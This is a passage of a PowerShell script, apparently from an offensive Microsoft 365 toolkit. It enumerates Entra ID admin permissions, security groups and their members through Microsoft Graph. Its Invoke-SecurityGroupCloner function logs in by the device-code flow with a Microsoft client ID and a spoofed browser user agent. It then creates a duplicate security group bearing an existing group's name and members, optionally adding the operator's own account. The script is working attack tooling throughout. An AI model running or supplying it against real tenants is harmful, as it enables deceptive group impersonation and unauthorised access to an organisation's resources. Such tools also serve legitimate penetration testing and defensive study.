                $userobject = Invoke-RestMethod -uri "$($graphApiUrl)/users/$userorgroup" -Headers $headers
                $principals += $userobject.userPrincipalName
            }
            Write-Host ($Entscopeadminitem.permissionId + ", " + $Entscopeadminitem.permissionType + ", " + $($principals -join '; '))
            }
            Write-Host ""
            Write-Host ("=" * 80) 
        }
        
    }
}




function Get-SecurityGroups{
param (
        [string] $AccessToken
    )
$headers = @{
    Authorization = "Bearer $accessToken"
}

Write-Host -ForegroundColor Yellow "[*] Now getting a list of groups along with members from the directory..."

# Get all groups and group types
$graphApiUrl = "https://graph.microsoft.com/v1.0"
$groupsUrl = "$graphApiUrl/groups?$filter=securityEnabled eq true"

$groupsResponse = Invoke-RestMethod -Uri $groupsUrl -Headers $headers -Method Get

$groups = $groupsResponse.value


#Get Group Members

$groupsWithMemberIDs = @()

foreach ($group in $groups) {
    $groupId = $group.id
    $membersUrl = "$graphApiUrl/groups/$groupId/members"

    $membersResponse = Invoke-RestMethod -Uri $membersUrl -Headers $headers -Method Get
    $members = $membersResponse.value

    $memberIds = $members | ForEach-Object { $_.id }

    $groupInfo = @{
        GroupName = $group.displayName
        MemberIds = $memberIds -join ","
    }
    Write-Host ("Group Name: " + $group.displayName + " | Members: " + ($($members.userPrincipalName) -join ', '))
    Write-Host ""
    Write-Host ("=" * 80) 
    $groupsWithMemberIDs += New-Object PSObject -Property $groupInfo
}

return $groupsWithMemberIDs

}


function Create-SecurityGroupWithMembers {
    param (
        [string] $AccessToken,
        [string] $DisplayName,
        [string[]] $MemberIds
    )

    $graphApiUrl = "https://graph.microsoft.com/v1.0"
    $createGroupUrl = "$graphApiUrl/groups"

    $headers = @{
        Authorization = "Bearer $AccessToken"
        "Content-Type" = "application/json"
    }

    $groupProperties = @{
        displayName = $DisplayName
        securityEnabled = $true
        mailEnabled = $false
        mailNickname = $DisplayName -replace ' ', ''
        "members@odata.bind" = $MemberIds
    }

    $groupData = @{
        displayName = $DisplayName
        securityEnabled = $true
        mailEnabled = $false
        mailNickname = $DisplayName -replace ' ', ''
        "members@odata.bind" = $MemberIds
    }

    $groupJson = $groupData | ConvertTo-Json

    $response = Invoke-RestMethod -Uri $createGroupUrl -Headers $headers -Method Post -Body $groupJson

    if ($response -ne $null) {
        Write-Host -ForegroundColor Green "Security Group '$DisplayName' created successfully."
    } else {
        Write-Error "Error creating the security group."
    }
}



function Invoke-SecurityGroupCloner{


# Login
    Write-Host -ForegroundColor yellow "[*] First you need to login as the user you want to clone a group as."

    $body = @{
        "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        "resource" =      "https://graph.microsoft.com"
    }
    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $Headers=@{}
    $Headers["User-Agent"] = $UserAgent
    $authResponse = Invoke-RestMethod `
        -UseBasicParsing `
        -Method Post `
        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
        -Headers $Headers `
        -Body $body
    Write-Host -ForegroundColor yellow $authResponse.Message

    $continue = "authorization_pending"
    while($continue)
            {
    
        $body=@{
            "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
            "code" =       $authResponse.device_code
        }
        try{
        $global:tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
        }
        catch{
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Output $details.error
        }
        if($tokens)
            {
                write-host -ForegroundColor yellow '[*] Successful Auth! Access and refresh tokens are accessible in the $tokens variable.'
                $accesstoken = $tokens.access_token
                break
            }
        Start-Sleep -Seconds 3
    }    



$headers = @{
    Authorization = "Bearer $accessToken"
}

$secgroups = Get-SecurityGroups -AccessToken $accessToken
$CloneGroup = ""
while($CloneGroup -eq ""){
Write-Host -ForegroundColor Cyan "[*] Enter a group name you want to clone:"
$CloneGroup = Read-Host 

if ($secgroups.GroupName -contains $CloneGroup) {
    Write-Host -ForegroundColor yellow ("[*] Found group " + $CloneGroup)
} else {
    Write-Output "Invalid group try again."
    $CloneGroup = ""
}
}

$memberIds = @()
foreach ($group in $secgroups){
    If ($group.GroupName -eq $cloneGroup){
        $memberlist = $group.memberIds.split(",")
        foreach($member in $memberlist){
            $memberIds += ("https://graph.microsoft.com/v1.0/users/" + $member )
        }
    }
}
Write-Host -ForegroundColor Cyan "[*] Do you want to add your current user to the cloned group? (Yes/No)"
$answer = Read-Host 
$answer = $answer.ToLower()
if ($answer -eq "yes" -or $answer -eq "y") {
    Write-Host -ForegroundColor yellow "[*] Adding current user to the cloned group..."
    $currentuser = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers
    $memberIds += ("https://graph.microsoft.com/v1.0/users/" + $currentuser.Id)
} elseif ($answer -eq "no" -or $answer -eq "n") {
    Write-Output "[*] Not adding your user"
} else {
    Write-Output "Invalid input. Please enter Yes or No."
}

$memberIdsUniq = $memberIds | Select-Object -Unique

Create-SecurityGroupWithMembers -AccessToken $accessToken -DisplayName $CloneGroup -MemberIds $memberIdsUniq
}
